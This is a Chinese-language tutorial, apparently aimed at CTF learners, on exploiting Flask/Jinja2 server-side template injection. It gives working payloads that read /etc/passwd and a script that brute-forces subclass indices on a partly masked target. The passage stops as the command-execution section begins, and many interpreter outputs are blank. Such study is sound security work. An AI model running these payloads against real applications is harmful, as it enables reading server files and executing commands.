# Flask-jinja2 SSTI 一般利用姿势
## SSTI 中常用的魔术方法
很多刚开始学习SSTI的新手可能看到上面的利用方法就蒙圈了，不太懂为什么要这么做，下面来讲一下关于Python中类的知识。  
面向对象语言的方法来自于类，对于python，有很多好用的函数库，我们经常会再写Python中用到import来引入许多的类和方法，python的str(字符串)、dict(字典)、tuple(元组)、list(列表)这些在Python类结构的基类都是
**object** ，而object拥有众多的子类。
`__class__`：用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。 `__class__` 是类的一个内置属性，表示类的类型，返回
`` ； 也是类的实例的属性，表示实例对象的类。
    >>> ''.__class__
    >>> ().__class__
    >>> [].__class__
    >>> {}.__class__
`__bases__`：用来查看类的基类，也可以使用数组索引来查看特定位置的值。 通过该属性可以查看该类的所有直接父类，该属性返回所有直接父类组成的
**元组** （虽然只有一个元素）。注意是直接父类！！！
    >>> ().__class__.__bases__
    (,)
    >>> ''.__class__.__bases__
    (,)
    >>> [].__class__.__bases__
    (,)
    >>> {}.__class__.__bases__
    (,)
    >>> ''.__class__.__bases__[0].__bases__[0]   // python2下雨python3下不同
    >>> [].__class__.__bases__[0]
获取基类还能用 `__mro__` 方法，`__mro__` 方法可以用来获取一个类的调用顺序，比如：
    >>> ''.__class__.__mro__   // python2下和python3下不同
    (, )
    >>> [].__class__.__mro__
    (, )
    >>> {}.__class__.__mro__
    (, )
    >>> ().__class__.__mro__
    (, )
    >>> ().__class__.__mro__[1]            // 返回的是一个类元组，使用索引就能获取基类了
除此之外，我们还可以利用 `__base__` 方法获取直接基类：
    >>> "".__class__.__base__
有这些类继承的方法，我们就可以从任何一个变量，回溯到最顶层基类（``）中去，再获得到此基类所有实现的类，就可以获得到很多的类和方法了。
`__subclasses__()`：查看当前类的子类组成的列表，即返回基类object的子类。
    >>> [].__class__.__bases__[0].__subclasses__()
    [, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ]
查阅起来有些困难，来列举一下：
    for i in enumerate(''.__class__.__mro__[-1].__subclasses__()): print i
    .....
    (0, )
    (1, )
    (2, )
    (3, )
    (4, )
    (5, )
    (6, )
    (7, )
    (8, )
    (9, )
    (10, )
    (11, )
    (12, )
    (13, )
    (14, )
    (15, )
    (16, )
    (17, )
    (18, )
    ......
    (38, )
    (39, )
    (40, )
    (41, )
    (42, )
    (43, )
    ......
**注意：** 这里要记住一点2.7和3.6版本返回的子类不是一样的，但是2.7有的3.6大部分都有。
当然我们也可以直接用`object.__subclasses__()`，会得到和上面一样的结果。SSTI
的主要目的就是从这么多的子类中找出可以利用的类（一般是指读写文件或执行命令的类）加以利用。
`__builtins__`：以一个集合的形式查看其引用
> #### 内建函数
>
> 当我们启动一个python解释器时，即时没有创建任何变量或者函数，还是会有很多函数可以使用，我们称之为内建函数。
>
> 内建函数并不需要我们自己做定义，而是在启动python解释器的时候，就已经导入到内存中供我们使用，想要了解这里面的工作原理，我们可以从名称空间开始。
>
> `__builtins__` 方法是做为默认初始模块出现的，可用于查看当前所有导入的内建函数。
`__globals__`：该方法会以字典的形式返回当前位置的所有全局变量，与 func_globals
等价。该属性是函数特有的属性，记录当前文件全局变量的值，如果某个文件调用了os、sys等库，但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用globals属性访问全局的变量。该属性保存的是函数全局变量的字典引用。
`__import__()`：该方法用于动态加载类和函数 。如果一个模块经常变化就可以使用 `__import__()` 来动态载入，就是
`import`。语法：`__import__(模块名)`
这样我们在进行SSTI注入的时候就可以通过这种方式使用很多的类和方法，通过子类再去获取子类的子类、更多的方法，找出可以利用的类和方法加以利用。总之，是通过python的对象的继承来一步步实现文件读取和命令执行的：
    找到父类 ---> 寻找子类 ---> 找关于命令执行或者文件操作的模块。
但是遇上一个SSTI的题，该如何下手？大体上有以下几种思路，简单介绍一下，后续有详细总结。
  * 查配置文件
  * 命令执行（其实就是沙盒逃逸类题目的利用方式）
  * 文件读取
## 利用 SSTI 读取文件
### Python 2
在上文中我们使用 `__subclasses__` 方法查看子类的时候，发现可以发现索引号为40指向file类：
    for i in enumerate(''.__class__.__mro__[-1].__subclasses__()): print i
    .....
    (0, )
    (1, )
    (2, )
    (3, )
    (4, )
    (5, )
    (6, )
    (7, )
    (8, )
    (9, )
    (10, )
    (11, )
    (12, )
    (13, )
    (14, )
    (15, )
    (16, )
    (17, )
    (18, )
    ......
    (38, )
    (39, )
    (40, )
    (41, )
    (42, )
    (43, )
    ......
此file类可以直接用来读取文件：
    {{[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read()}}
### Python 3
使用file类读取文件的方法仅限于Python 2环境，在Python 3环境中file类已经没有了。我们可以用`` 这个类去读取文件。
首先编写脚本遍历目标Python环境中 `` 这个类索引号：
    import requests
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
    }
    for i in range(500):
        url = "http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"]}}"
        res = requests.get(url=url, headers=headers)
        if 'FileLoader' in res.text:
            print(i)
    # 得到编号为79
所以payload如下：
    {{().__class__.__bases__[0].__subclasses__()[79]["get_data"](0, "/etc/passwd")}}
## 利用 SSTI 执行命令
可以用来执行命令的类有很多，其基本原理就是遍历含有eval函数即os模块的子类，利用这些子类中的eval函数即os模块执行命令。这里我们简单挑几个常用的讲解。
### 寻找内建函数 eval 执行命令
首先编写脚本遍历目标Python环境中含有内建函数 eval 的子类的索引号：
    import requests
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
    }
    for i in range(500):